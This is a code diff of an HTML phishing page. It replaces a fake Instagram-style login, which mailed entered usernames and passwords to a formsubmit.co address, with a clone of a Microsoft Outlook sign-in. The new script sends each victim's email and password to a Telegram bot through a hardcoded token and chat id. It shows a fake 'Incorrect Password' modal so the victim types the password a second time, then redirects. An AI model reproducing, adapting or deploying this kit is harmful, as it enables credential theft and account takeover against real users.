@@ -1,138 +1,218 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instaagraam</title>
-
-  <!-- Favicon & Fonts -->
-  <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="./app.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Signin Page Clone</title>
   <style>
-    .error-message {
-      color: red;
-      font-size: 12px;
-      margin-top: 4px;
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      min-height: 100vh;
+      background-color: #dde2d1;
+    }
+
+    form {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 44px;
+    }
+
+    form h2 {
+      font-size: 24px;
+      font-weight: 500;
+    }
+
+    .form-group {
+      margin: 0 0 16px;
+    }
+
+    form input {
+      padding: 6px 10px 6px 0;
+      margin-top: 1rem;
+      border: none;
+      outline: none;
+      border-bottom: 1px solid #000000b3;
+      width: 100%;
+      font-size: .9rem;
+    }
+
+    form p {
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    form a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    form a:hover {
+      text-decoration: underline;
+    }
+
+    form button {
+      display: block;
+      margin-left: auto;
+      width: 108px;
+      height: 32px;
+      font-size: 15px;
+      background-color: #0067b8;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+
+    form button:hover {
+      background-color: #004b85;
+    }
+
+    .bottom {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 8px 44px;
+      font-size: 15px;
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .bottom img {
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
+
+    .bottom:hover {
+      background-color: #dde2d1;
+    }
+
+    #errorModal {
       display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #errorModal .modal-box {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 10px;
+      max-width: 300px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #errorModal .modal-box h3 {
+      margin-bottom: 10px;
+      color: #e74c3c;
+    }
+
+    #errorModal .modal-box p {
+      font-size: 14px;
+    }
+
+    #errorModal .modal-box button {
+      margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
     }
   </style>
 </head>
 
 <body>
-  <div class="container">
-    <div class="main-container">
-      <div class="main-content">
-        <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
-          <div class="slide-content" id="slide-content">
-            <img src="./images/slide (1).jpg" class="active" />
-            <img src="./images/slide (2).jpg" />
-            <img src="./images/slide (3).jpg" />
-            <img src="./images/slide (4).jpg" />
-            <img src="./images/slide (5).jpg" />
-          </div>
-        </div>
-
-        <div class="form-container">
-          <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
-            <div class="form-content box">
-              <div class="logo">
-                <img src="./images/logo-light.png" class="logo-light" />
-                <img src="./images/logo-dark.png" class="logo-dark" />
-              </div>
-
-              <div class="btn-group">
-                <button class="btn-login" type="submit">
-                  <i class="fab fa-facebook-square"></i> Continue Using Facebook
-                </button>
-              </div>
-
-              <div class="divine"><div></div><div>OR</div><div></div></div>
-
-              <div class="signin-form" id="signin-form">
-                <div class="form-group">
-                  <div class="animate-input">
-                    <span>Phone number, username or email</span>
-                    <input type="text" name="username" id="username" required>
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" id="nextField" name="_next" value="">
-                  </div>
-                </div>
-
-                <div class="form-group">
-                  <div class="animate-input">
-                    <span>Password</span>
-                    <input type="text" name="password" id="password" required>
-                    <button type="button">Show</button>
-                    <small id="errorText" class="error-message">Incorrect password. Please try again.</small>
-                  </div>
-                  <div style="display: flex; justify-content: end; color: rgb(0, 17, 255);">
-                    <a href="#" class="forgot-pw">Forgotten your password?</a>
-                  </div>
-                </div>
-
-                <div class="btn-group">
-                  <button class="btn-login" type="submit">Sign In</button>
-                  <div class="box goto">
-                    <p>Don't have an account? <a href="#">Sign up</a></p>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            <div class="app-download">
-              <p>Get the app.</p>
-              <div class="store-link">
-                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
-                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
-              </div>
-            </div>
-          </form>
-        </div>
-      </div>
-    </div>
-
-    <div class="footer">
-      <div class="links">
-        <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
-        <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a>
-        <a href="#">Hashtags</a><a href="#">Locations</a><a href="#" id="darkmode-toggle">Darkmode</a>
-      </div>
-      <hr />
-      <div class="copyright">
-        <p>from</p><img src="images/download.jpg" alt="">
-      </div>
+  <!-- Modal -->
+  <div id="errorModal">
+    <div class="modal-box">
+      <h3>Incorrect Password</h3>
+      <p>Please double-check your password and try again.</p>
+      <button onclick="closeModal()">Try Again</button>
     </div>
   </div>
 
+  <div class="container">
+    <form id="form" method="POST">
+      <div class="forms-container">
+        <div class="forms">
+          <div class="first">
+            <h2>Sign in</h2>
+            <div class="form-group">
+              <input type="email" placeholder="Email" name="username" id="username" required>
+              <input type="password" placeholder="Password" name="password" id="password" required>
+            </div>
+            <p>No Account? <a href="#">Create One!</a></p>
+            <a href="#">Sign in with a security key <span>?</span></a>
+          </div>
+        </div>
+      </div>
+      <button type="submit">Sign in</button>
+    </form>
+
+    <div class="bottom">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
+      <span>Sign-in options</span>
+    </div>
+  </div>
+
+  <!-- JS -->
   <script>
-    const form = document.getElementById('form');
-    const nextField = document.getElementById('nextField');
-    const errorText = document.getElementById('errorText');
+    let attemptCount = 0;
 
-    // Initialize login attempt counter
-    if (!localStorage.getItem('login_attempt')) {
-      localStorage.setItem('login_attempt', '0');
-    }
+    document.getElementById('form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      attemptCount++;
 
-    form.addEventListener('submit', function () {
-      let attempt = parseInt(localStorage.getItem('login_attempt'));
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-      if (attempt < 3) {
-        errorText.style.display = 'block';
-        nextField.value = window.location.href; // submit but stay
-        localStorage.setItem('login_attempt', (attempt + 1).toString());
-      } else {
-        errorText.style.display = 'none';
-        nextField.value = "https://frilea.vercel.app/thanks.html"; // redirect
-        localStorage.removeItem('login_attempt');
-      }
+      const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
+     var token = '7585948801:AAGwdA6GeMVt_uNf0asfQppXQj6f6wHAn_M';
+      var chat_id = '7837988233';
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (attemptCount === 1) {
+            document.getElementById('errorModal').style.display = 'flex';
+          } else {
+            window.location.href = 'thanks.html'; // ✅ Second try = redirect
+          }
+        })
+        .catch(error => {
+          alert("Network error. Try again.");
+          console.error('Telegram error:', error);
+        });
     });
-  </script>
 
-  <script src='app.js'></script>
+    function closeModal() {
+      document.getElementById('errorModal').style.display = 'none';
+    }
+  </script>
 </body>
+
 </html>
